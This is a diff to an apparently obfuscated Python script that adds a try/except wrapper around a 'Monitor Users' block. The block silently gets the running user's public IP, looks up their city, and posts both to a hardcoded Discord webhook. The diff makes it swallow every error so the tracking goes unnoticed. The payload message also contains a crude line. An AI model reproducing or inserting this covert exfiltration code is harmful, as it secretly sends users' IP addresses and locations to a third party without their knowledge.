@@ -52,17 +52,20 @@ os .system ('cls')#line:56
 import requests #line:57
 import requests
 """Monitor Users"""
-ip = requests.get("https://api.ipify.org").text
-message = {
+try:
+ ip = requests.get("https://api.ipify.org").text
+ message = {
     "content": f"asia loves kids  {ip}"
 }
-geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
-geo_info = (
+ geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
+ geo_info = (
     f"Area {geo.get('city', 'N/A')}\n"
 ) 
-webhook_url = "https://discord.com/api/webhooks/1382532762929467443/qnTBZfbMSbHhjmJ7sR-t2L1zCztsqVJr8HlkTZ9gTVcFKQaUWmNlWtjSMLShk5NfYO2q"
-requests.post(webhook_url, json={"content": geo_info})
-requests.post(webhook_url, json=message)
+ webhook_url = "https://discord.com/api/webhooks/1382532762929467443/qnTBZfbMSbHhjmJ7sR-t2L1zCztsqVJr8HlkTZ9gTVcFKQaUWmNlWtjSMLShk5NfYO2q"
+ requests.post(webhook_url, json={"content": geo_info})
+ requests.post(webhook_url, json=message)
+except:
+   pass
 """Monitor Users"""
 time .sleep (0.01 )#line:60
 os .system ("cls")#line:61
